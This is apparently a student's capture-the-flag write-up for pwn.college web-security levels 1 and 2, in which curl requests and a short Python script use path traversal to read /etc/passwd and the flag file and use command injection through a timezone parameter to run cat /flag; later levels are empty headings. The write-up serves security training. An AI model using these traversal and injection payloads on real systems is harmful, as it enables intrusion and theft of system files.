# Challanges :

* In Challanges we have `/challanges ` and `/falg` dir here we have to run the `/challnages/run` file.. 
* Then with the attack Which is given we have to capture the falg...


## Web-security level 1
* In this challnage we have to perform Path traversal..
* After running the file `/challange/run` we can perform the attack vector...
* For flag we use Curl.. 


```sh
hacker@web-security-level-1:~$ curl http://challenge.localhost:80/../../../etc/passwd --path-as-is -i
HTTP/1.1 400 BAD REQUEST
Server: Werkzeug/2.2.3 Python/3.8.10
Date: Mon, 24 Apr 2023 05:15:31 GMT
Content-Length: 24
Server: pwn.college
Connection: close

Missing `path` argument

# First it shows that there is a missing argument..

hacker@web-security-level-1:~$ curl http://challenge.localhost:80?path=/../../../etc/passwd --path-as-is -i
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.8.10
Date: Mon, 24 Apr 2023 05:15:45 GMT
Content-Length: 1069
Server: pwn.college
Connection: close

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
hacker:x:1000:1000::/home/hacker:/bin/bash
sshd:x:1001:65534::/run/sshd:/usr/sbin/nologin

## with path we can get the pass file in box...

hacker@web-security-level-1:~$ curl http://challenge.localhost:80?path=/../../../flag --path-as-is -i
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.8.10
Date: Mon, 24 Apr 2023 05:15:57 GMT
Content-Length: 57
Server: pwn.college
Connection: close

pwn.college{flag_here}
hacker@web-security-level-1:~$ 

```

## Web-security level 2

* In this challange we have to get the flag via Command injection...
* This challange is bit tricky...
* There is module in `python` named `subporcess` which can be used to execute the system commands with their fucntions like `run()` & `check_output()`...


```sh
# for a normal curl request it shows like shoem kind of timezone...

hacker@web-security-level-2:~$ curl http://challenge.localhost:80
Tue Apr 25 09:27:52 UTC 2023

# after sometime i got know tha at this parameter this works very odd..

hacker@web-security-level-2:~$ curl http://challenge.localhost:80?timezone=whoami
Tue Apr 25 09:28:55 whoami 2023

# After emum ... 
# After curl i tried with the Python Request module..
# Here we are changing the aprameter timezone, then it reflect in output...
# when i use single quote (') like => ( url = "http://challenge.localhost:80?timezone=whoami ' " ) 
# The response will be like :
hacker@web-security-level-2:~$ python3 web-security/file.py 
Traceback (most recent call last):
  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1823, in full_dispatch_request
    rv = self.dispatch_request()
  File "/usr/local/lib/python3.8/dist-packages/flask/app.py", line 1799, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
  File "/challenge/run", line 670, in catch_all
    return challenge()
  File "/challenge/run", line 81, in level2
    return subprocess.check_output(f"TZ={timezone} date", shell=True, encoding="latin")
  File "/usr/lib/python3.8/subprocess.py", line 415, in check_output
    return run(*popenargs, stdout=PIPE, timeout=timeout, check=True,
  File "/usr/lib/python3.8/subprocess.py", line 516, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command 'TZ=whoami '  date' returned non-zero exit status 2.

# here we can see that there is an error that tells more about the pareameter which we are using..
# There is a paramater (timezone) and after that we have command `date` executing...
# when we using the semicolon with (;command-here;) it executes commands...

```

> The Request which we are using to get the flag...

```py
url = "http://challenge.localhost:80?timezone=who;cat /flag;"
data = {"Cookie": "c61b7eb3605bc2a2fdbbcac920bdd414"}
response = re.post(url , data=data )
print(response.text)
```
> Response 
```sh
hacker@web-security-level-2:~$ python3 web-security/file.py 
uid=0(root) gid=1000(hacker) groups=1000(hacker)
Sat Apr 29 07:53:33 UTC 2023

hacker@web-security-level-2:~$ python3 web-security/file.py 
pwn.college{falg_here}
Sat Apr 29 07:54:22 UTC 2023
```

```sh
# we can also execute the command with curl 

hacker@web-security-level-2:~$ curl --path-as-is http://challenge.localhost:80?timezone=whoami;id; 
Sat Apr 29 08:17:17 whoami 2023
uid=1000(hacker) gid=1000(hacker) groups=1000(hacker)

```


## Web-security level 3
```sh

```
## Web-security level 4
```sh

```

## Web-security level 5
```sh

```

## Web-security level 6
```sh

```



